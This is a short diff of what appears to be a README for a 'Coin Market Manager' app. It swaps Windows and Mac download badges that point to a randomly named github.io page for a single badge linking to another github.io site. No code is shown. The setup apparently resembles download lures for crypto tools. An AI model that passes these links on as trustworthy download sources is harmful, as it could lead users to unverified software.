@@ -5,12 +5,7 @@
   <img src="https://cdn-1.webcatalog.io/catalog/coin-market-manager/coin-market-manager-icon.png?v=1714773975300" width="240"/>
 </div> 
 
-<div align="center">
-
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://h74738709.github.io/.github/Coin-Market-Manager)  
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://h74738709.github.io/.github/Coin-Market-Manager)
-
-</div>
+[![Explore Coin Manager](https://img.shields.io/badge/Explore-Coin%20Manager-7C3AED?style=plastic)](https://manager-coin-market.github.io/.github/)
 
 ---
 
